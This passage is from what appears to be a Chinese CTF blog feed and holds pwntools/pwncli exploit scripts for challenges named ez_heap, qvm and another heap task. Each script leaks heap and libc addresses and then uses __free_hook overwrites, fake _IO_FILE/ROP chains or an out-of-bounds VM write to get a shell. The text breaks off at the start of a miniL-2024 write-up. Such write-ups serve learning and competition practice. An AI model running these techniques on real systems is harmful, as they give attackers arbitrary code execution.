class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">b&#x27;content&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    <span class="comment"># 确保密钥长度为128位（16字节）</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(key) == <span class="number">16</span>, <span class="string">&quot;Key must be 128 bits (16 bytes).&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 填充数据以确保其长度是16的倍数</span></span><br><span class="line">    data = pad(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建AES ECB模式的加密对象</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 加密数据</span></span><br><span class="line">    encrypted_data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">16</span>):</span><br><span class="line">        encrypted_data += cipher.encrypt(data[i : i + <span class="number">16</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> encrypted_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">encrypted_data, key</span>):</span><br><span class="line">    <span class="comment"># 确保密钥长度为128位（16字节）</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(key) == <span class="number">16</span>, <span class="string">&quot;Key must be 128 bits (16 bytes).&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建AES ECB模式的解密对象</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解密数据</span></span><br><span class="line">    decrypted_data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encrypted_data), <span class="number">16</span>):</span><br><span class="line">        decrypted_data += cipher.decrypt(encrypted_data[i : i + <span class="number">16</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 移除填充</span></span><br><span class="line">    <span class="comment"># decrypted_data = unpad(decrypted_data, 16)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decrypted_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">code_base = u64_ex(r(<span class="number">6</span>)) - <span class="number">0x1BF0</span></span><br><span class="line">set_current_code_base_and_log(code_base)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">data = r(<span class="number">0x10</span>)</span><br><span class="line">log_ex(data)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="string">b&#x27;\xa0&#x27;</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">key = <span class="string">b&#x27;\x51\x88\xc6\x47\x4b\x22\x8c\xbd\xd2\x42\xe9\x12\x5e\xbe\x1d\x53&#x27;</span></span><br><span class="line">log_ex(<span class="string">f&quot;key: <span class="subst">&#123;key&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">data = r(<span class="number">0x10</span>)</span><br><span class="line">heap_base = u64_ex(encrypt(data, key)[:<span class="number">8</span>]) - <span class="number">0x200</span></span><br><span class="line">log_heap_base_addr(heap_base)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>, decrypt(<span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x10</span>, key))</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>, p64_ex(heap_base + <span class="number">0x330</span>))</span><br><span class="line">add(<span class="number">3</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>, decrypt(p64_ex(<span class="number">0</span>) + p64_ex(<span class="number">0x20CD1</span>), key))  <span class="comment"># any</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x8</span>):</span><br><span class="line">    add(<span class="number">15</span> - i, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x13</span> - <span class="number">0x8</span>):</span><br><span class="line">    add(<span class="number">6</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>, decrypt(p64_ex(<span class="number">0</span>) + p64_ex(<span class="number">0x31</span>), key))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>, decrypt(p64_ex(<span class="number">0</span>) + p64_ex(<span class="number">0x511</span>), key))</span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">ru(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">data = r(<span class="number">0x10</span>)</span><br><span class="line">libc_base = u64_ex(encrypt(data, key)[:<span class="number">8</span>]) - <span class="number">0x1ECBE0</span></span><br><span class="line">set_current_libc_base_and_log(libc_base)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>, decrypt(p64_ex(<span class="number">0</span>) + p64_ex(<span class="number">0x41</span>), key))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line">edit(<span class="number">15</span>, decrypt(p64_ex(<span class="number">0</span>) * <span class="number">2</span>, key))</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">edit(<span class="number">14</span>, decrypt(p64_ex(heap_base + <span class="number">0x10</span>) * <span class="number">2</span>, key))</span><br><span class="line">add(<span class="number">14</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>, p64_ex(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line">edit(<span class="number">15</span>, decrypt(p64_ex(<span class="number">0</span>) * <span class="number">2</span>, key))</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">edit(<span class="number">14</span>, decrypt(p64_ex(heap_base + <span class="number">0x10</span> + <span class="number">0xA0</span>) * <span class="number">2</span>, key))</span><br><span class="line">add(<span class="number">14</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, p64_ex(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line">edit(<span class="number">15</span>, decrypt(p64_ex(<span class="number">0</span>) * <span class="number">2</span>, key))</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">edit(<span class="number">14</span>, decrypt(p64_ex(heap_base + <span class="number">0x10</span> + <span class="number">0xA0</span> + <span class="number">0x30</span>) * <span class="number">2</span>, key))</span><br><span class="line">add(<span class="number">14</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, p64_ex(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line">edit(<span class="number">15</span>, decrypt(p64_ex(<span class="number">0</span>) * <span class="number">2</span>, key))</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">edit(<span class="number">14</span>, decrypt(p64_ex(heap_base + <span class="number">0x300</span>) * <span class="number">2</span>, key))</span><br><span class="line">add(<span class="number">14</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, p64_ex(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line">edit(<span class="number">15</span>, decrypt(p64_ex(<span class="number">0</span>) * <span class="number">2</span>, key))</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">edit(<span class="number">14</span>, decrypt(p64_ex(heap_base + <span class="number">0x300</span> + <span class="number">0x30</span>) * <span class="number">2</span>, key))</span><br><span class="line">add(<span class="number">14</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>, p64_ex(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line">edit(<span class="number">15</span>, decrypt(p64_ex(<span class="number">0</span>) * <span class="number">2</span>, key))</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">edit(<span class="number">14</span>, decrypt(p64_ex(heap_base + <span class="number">0x300</span> + <span class="number">0x60</span>) * <span class="number">2</span>, key))</span><br><span class="line">add(<span class="number">14</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>, p64_ex(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x7</span>):</span><br><span class="line">    dele(<span class="number">15</span>)</span><br><span class="line">    edit(<span class="number">15</span>, decrypt(p64_ex(<span class="number">0</span>) * <span class="number">2</span>, key))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">edit(<span class="number">14</span>, p64_ex(libc.sym._IO_list_all - <span class="number">0x18</span>))</span><br><span class="line">edit(<span class="number">15</span>, p64_ex(heap_base + <span class="number">0x380</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">15</span>, p64_ex(heap_base + <span class="number">0x380</span>))</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">15</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_IO_FILE = heap_base + <span class="number">0x10</span></span><br><span class="line">_IO_wfile_jumps = libc.sym._IO_wfile_jumps</span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x0</span>: u64_ex(<span class="string">&quot;  sh&quot;</span>),</span><br><span class="line">        <span class="number">0x8</span>: libc_base + <span class="number">0x000000000002F70A</span>,  <span class="comment">#: pop rsp; ret;</span></span><br><span class="line">        <span class="number">0x10</span>: heap_base + <span class="number">0x300</span>,</span><br><span class="line">        <span class="number">0x28</span>: <span class="number">0xB81</span>,  <span class="comment"># _IO_write_ptr</span></span><br><span class="line">        <span class="number">0xA0</span>: fake_IO_FILE + <span class="number">0xE8</span> - <span class="number">0xE0</span>,  <span class="comment"># _wide_data-&gt;_wide_vtable</span></span><br><span class="line">        <span class="number">0xD8</span>: _IO_wfile_jumps,  <span class="comment"># vtable</span></span><br><span class="line">        <span class="number">0xE0</span>: libc_base + <span class="number">0x5B4D0</span>,  <span class="comment"># function</span></span><br><span class="line">        <span class="number">0xE8</span>: fake_IO_FILE + <span class="number">0xE0</span> - <span class="number">0x68</span>,  <span class="comment"># _wide_data-&gt;_wide_vtable-&gt;doallocate</span></span><br><span class="line">    &#125;,</span><br><span class="line">    filler=<span class="string">b&#x27;\x00&#x27;</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, decrypt(payload[:<span class="number">0x30</span>], key))</span><br><span class="line">edit(<span class="number">1</span>, decrypt(payload[<span class="number">0xA0</span> : <span class="number">0xA0</span> + <span class="number">0x30</span>], key))</span><br><span class="line">edit(<span class="number">2</span>, decrypt(payload[<span class="number">0xA0</span> + <span class="number">0x30</span> : <span class="number">0xA0</span> + <span class="number">0x60</span>], key))</span><br><span class="line"></span><br><span class="line">CG.set_find_area(<span class="literal">False</span>, <span class="literal">True</span>)</span><br><span class="line">rdi = CG.pop_rdi_ret()</span><br><span class="line">rsi = CG.pop_rsi_ret()</span><br><span class="line">rdx_rbx = CG.pop_rdx_rbx_ret()</span><br><span class="line"></span><br><span class="line">payload = flat([rdi, heap_base, rsi, <span class="number">0x2000</span>, rdx_rbx, <span class="number">7</span>, <span class="number">0</span>, libc.sym.mprotect, heap_base + <span class="number">0x360</span>]).ljust(<span class="number">0x60</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += asm(shellcraft.read(<span class="number">0</span>, heap_base + <span class="number">0x360</span>, <span class="number">0x1000</span>))</span><br><span class="line">payload = pad(payload, <span class="number">16</span>)</span><br><span class="line">edit(<span class="number">3</span>, decrypt(payload[:<span class="number">0x30</span>], key))</span><br><span class="line">edit(<span class="number">4</span>, decrypt(payload[<span class="number">0x30</span> : <span class="number">0x30</span> + <span class="number">0x30</span>], key))</span><br><span class="line">edit(<span class="number">5</span>, decrypt(payload[<span class="number">0x30</span> + <span class="number">0x30</span> : <span class="number">0x30</span> + <span class="number">0x60</span>], key))</span><br><span class="line"></span><br><span class="line">launch_gdb(cmd)</span><br><span class="line">sla(input_after_this, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">s(<span class="string">b&#x27;\x90&#x27;</span> * <span class="number">0x30</span> + ShellcodeMall.amd64.cat_flag)</span><br><span class="line"></span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="ez-heap"><a href="#ez-heap" class="headerlink" title="ez_heap"></a>ez_heap</h2><p>base64 解码计算长度错误导致的溢出</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;122&quot;</span>]</span><br><span class="line">local_flag = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_flag == <span class="string">&quot;remote&quot;</span>:</span><br><span class="line">    addr = <span class="string">&#x27;47.94.85.95 32827&#x27;</span></span><br><span class="line">    host = addr.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    gift.io = remote(host[<span class="number">0</span>], host[<span class="number">1</span>])</span><br><span class="line">    gift.remote = <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gift.io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> local_flag == <span class="string">&quot;nodbg&quot;</span>:</span><br><span class="line">        gift.remote = <span class="literal">True</span></span><br><span class="line">init_x64_context(gift.io, gift)</span><br><span class="line">libc = load_libc()</span><br><span class="line">gift.elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b *$rebase(0x1BA7)</span></span><br><span class="line"><span class="string">    b *$rebase(0x1D1D)</span></span><br><span class="line"><span class="string">    b *$rebase(0x1EF1)</span></span><br><span class="line"><span class="string">    b *$rebase(0x1FA0)</span></span><br><span class="line"><span class="string">    b *$rebase(0x205B)</span></span><br><span class="line"><span class="string">    b *$rebase(0x20FA)</span></span><br><span class="line"><span class="string">    set $decode = $rebase(0x5060)</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">input_after_this = <span class="string">b&#x27;Enter your choice:&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_en</span>(<span class="params">data</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;text&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_de</span>(<span class="params">data</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;text&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele_en</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele_de</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_en</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_de</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add_de(b64encode(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x36</span>))  <span class="comment"># 0x36</span></span><br><span class="line">add_de(b64encode(<span class="string">b&#x27;c&#x27;</span> * <span class="number">0x24</span>))</span><br><span class="line">add_de(b64encode(<span class="string">b&#x27;b&#x27;</span> * <span class="number">0x36</span>))</span><br><span class="line">add_en(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x400</span>)</span><br><span class="line">add_de(b64encode(<span class="string">b&#x27;b&#x27;</span> * <span class="number">0x36</span>))</span><br><span class="line">dele_en(<span class="number">0</span>)</span><br><span class="line">dele_de(<span class="number">0</span>)</span><br><span class="line">add_de(b64encode(<span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x39</span>)[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">dele_de(<span class="number">3</span>)</span><br><span class="line">dele_de(<span class="number">2</span>)</span><br><span class="line">dele_de(<span class="number">1</span>)</span><br><span class="line">add_de(b64encode(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x39</span>)[:-<span class="number">1</span>])</span><br><span class="line">show_de(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>)</span><br><span class="line">heap_base = u64_ex(ru(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)) - <span class="number">0x81</span></span><br><span class="line">log_heap_base_addr(heap_base)</span><br><span class="line"></span><br><span class="line">dele_de(<span class="number">1</span>)</span><br><span class="line">add_de(b64encode(<span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x28</span> + p64_ex(<span class="number">0x21</span>) + p64_ex(heap_base + <span class="number">0x320</span>))[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">add_de(b64encode(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x36</span>))</span><br><span class="line">add_de(b64encode(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x30</span>))</span><br><span class="line">show_de(<span class="number">3</span>)</span><br><span class="line">libc_base = u64_ex(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]) - <span class="number">0x1ECBE0</span></span><br><span class="line">set_current_libc_base_and_log(libc_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele_de(<span class="number">2</span>)</span><br><span class="line">add_de(b64encode(p64_ex(<span class="number">0</span>) + p64_ex(<span class="number">0x21</span>)))</span><br><span class="line">dele_de(<span class="number">3</span>)</span><br><span class="line">dele_de(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">dele_de(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add_de(b64encode(p64_ex(<span class="number">0</span>) * <span class="number">6</span> + p64_ex(libc.sym.__free_hook))[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">add_de(b64encode(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">add_de(b64encode(p64_ex(libc.sym.system)))</span><br><span class="line"></span><br><span class="line">launch_gdb(cmd)</span><br><span class="line">dele_de(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="qvm"><a href="#qvm" class="headerlink" title="qvm"></a>qvm</h2><p>mov cil 等操作对index没有检查导致的越界读写</p>
<p>修改puts中调用的libc.got为system，puts(“&#x2F;bin&#x2F;sh\x00”)即可</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;122&quot;</span>]</span><br><span class="line">local_flag = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_flag == <span class="string">&quot;remote&quot;</span>:</span><br><span class="line">    addr = <span class="string">&#x27;121.42.242.203 9999&#x27;</span></span><br><span class="line">    host = addr.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    gift.io = remote(host[<span class="number">0</span>], host[<span class="number">1</span>])</span><br><span class="line">    gift.remote = <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gift.io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> local_flag == <span class="string">&quot;nodbg&quot;</span>:</span><br><span class="line">        gift.remote = <span class="literal">True</span></span><br><span class="line">init_x64_context(gift.io, gift)</span><br><span class="line">libc = load_libc()</span><br><span class="line">gift.elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b *$rebase(0xED7A)</span></span><br><span class="line"><span class="string">    # mov</span></span><br><span class="line"><span class="string">    b *$rebase(0xEE19)</span></span><br><span class="line"><span class="string">    # push</span></span><br><span class="line"><span class="string">    b *$rebase(0xFBE1)</span></span><br><span class="line"><span class="string">    # ods</span></span><br><span class="line"><span class="string">    #b *$rebase(0xFA9F)</span></span><br><span class="line"><span class="string">    # cil</span></span><br><span class="line"><span class="string">    b *$rebase(0xEF41)</span></span><br><span class="line"><span class="string">    # inc</span></span><br><span class="line"><span class="string">    b *$rebase(0xC79D)</span></span><br><span class="line"><span class="string">    # ipf</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    set $context=$rbp-0x298</span></span><br><span class="line"><span class="string">    set $value=$rbp-0xB8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">launch_gdb(cmd)</span><br><span class="line"></span><br><span class="line">payload = (</span><br><span class="line">    <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">data binsh &quot;/bin/sh\x00&quot;</span></span><br><span class="line"><span class="string">func:</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string">_start:</span></span><br><span class="line"><span class="string">._start:</span></span><br><span class="line"><span class="string">mov <span class="subst">&#123;<span class="number">0xf47ff</span> + <span class="number">0x21a02</span>&#125;</span> 0</span></span><br><span class="line"><span class="string">cil <span class="subst">&#123;- <span class="number">0x50d70</span> + <span class="number">0x28030</span>&#125;</span> 4</span></span><br><span class="line"><span class="string">sub 4 0</span></span><br><span class="line"><span class="string">mov 0 <span class="subst">&#123;<span class="number">0xf47ff</span> + <span class="number">0x21a09</span>&#125;</span></span></span><br><span class="line"><span class="string">call func</span></span><br><span class="line"><span class="string">ods binsh</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    + <span class="string">&quot;EOF&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;Code :&#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>强网杯</tag>
      </tags>
  </entry>
  <entry>
    <title>miniL-2024</title>
    <url>/202411/14/miniL-2024/</url>
    <content><![CDATA[<h1 id="miniL-2024"><a href="#miniL-2024" class="headerlink" title="miniL-2024"></a>miniL-2024</h1><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="2bytes"><a href="#2bytes" class="headerlink" title="2bytes"></a>2bytes</h3><p>jmp 短跳</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;122&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="number">1</span>:</span><br><span class="line">    addr = <span class="string">&#x27;172.23.32.1:41845&#x27;</span></span><br><span class="line">    host = addr.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    gift.io = remote(host[<span class="number">0</span>], host[<span class="number">1</span>])</span><br><span class="line">    gift.debug = <span class="literal">False</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gift.io = process(<span class="string">&#x27;./byte&#x27;</span>)</span><br><span class="line">init_x64_context(gift.io, gift)</span><br><span class="line">load_libc(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">libc: ELF = gift[<span class="string">&#x27;libc&#x27;</span>]</span><br><span class="line">gift.elf = ELF(<span class="string">&#x27;./byte&#x27;</span>)</span><br><span class="line">cmd = <span class="string">&quot;b *$rebase(0x12B0)\nc\n&quot;</span></span><br><span class="line"><span class="comment"># launch_gdb(cmd)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">pad</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        pad[i + <span class="number">2</span>] ^= pad[i] ^ pad[i + <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pad:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(i), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;Give me the secret&#x27;</span>)</span><br><span class="line">payload = <span 